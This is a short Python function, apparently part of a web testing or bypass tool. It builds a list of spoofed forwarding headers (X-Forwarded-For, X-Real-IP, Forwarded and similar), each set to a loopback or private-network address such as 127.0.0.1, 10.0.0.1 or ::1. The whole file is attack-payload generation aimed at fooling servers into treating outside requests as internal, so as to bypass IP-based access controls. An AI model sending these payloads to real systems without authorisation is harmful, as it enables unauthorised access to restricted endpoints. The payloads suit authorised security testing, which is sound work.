def build_forwarded():
    headers = ["X-Forwarded-For", "X-Forwarded", "X-Real-IP", "X-Client-IP",
    "X-Original-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Server",
    "X-Host", "Forwarded",]

    ips = ["127.0.0.1", "127.0.0.2", "localhost", "10.0.0.1", "10.0.0.2",
    "192.168.0.1", "192.168.1.1", "172.16.0.1", "172.17.0.1", "::1",]

    payloads = []

    for header in headers:
        for ip in ips:
            payloads.append({header: ip})

    return {"techniques": "Forwarded Headers", "payload": payloads, "location": "header",}